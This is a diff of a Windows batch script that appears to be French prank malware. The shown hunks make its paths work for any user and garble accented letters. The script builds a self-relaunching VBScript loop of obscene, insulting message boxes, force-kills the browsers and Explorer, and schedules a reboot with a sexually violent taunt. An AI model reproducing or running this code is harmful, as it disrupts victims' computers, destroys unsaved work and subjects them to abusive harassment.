@@ -1,6 +1,6 @@
 @echo off
-set ztmp=C:\Users\magal\AppData\Local\Temp\ztmp
-set MYFILES=C:\Users\magal\AppData\Local\Temp\afolder
+set ztmp=C:\Users\%USERNAME%\AppData\Local\Temp\ztmp
+set MYFILES=C:\Users\%USERNAME%\AppData\Local\Temp\afolder
 set bfcec=t10139.exe
 set cmdline=
 SHIFT /0
@@ -168,7 +168,7 @@ set file=alerte_enculay.mp3
 
 
 @echo do>%prenom%.vbs
-@echo x=msgbox ("TU N'AS PLUS DE PAYCAY ENFANT DE H*PISTE, LE 15-18 T'A BIEN SODOMISÉ LE CUL" ,16+4096, "Cisla'wned :noel: :Y")>>%prenom%.vbs
+@echo x=msgbox ("TU N'AS PLUS DE PAYCAY ENFANT DE H*PISTE, LE 15-18 T'A BIEN SODOMISÃ‰ LE CUL" ,16+4096, "Cisla'wned :noel: :Y")>>%prenom%.vbs
 @echo CreateObject("WScript.Shell").Run "%prenom%.vbs">>%prenom%.vbs
 @echo loop>>%prenom%.vbs
 
@@ -245,7 +245,7 @@ taskkill /F /IM firefox.exe
 taskkill /F /IM msedge.exe
 taskkill /F /IM iexplore.exe
 taskkill /F /IM explorer.exe
-shutdown -r -t 300 -c "Dans 5 minutes ton paycay va explosay fils de viol, le 15-18 t'as bien détruit le cul :) :noel: Vaincra >> :hap: LOL"
+shutdown -r -t 300 -c "Dans 5 minutes ton paycay va explosay fils de viol, le 15-18 t'as bien dÃ©truit le cul :) :noel: Vaincra >> :hap: LOL"
 
 :aaa
 if exist %nouveau%.vbs (
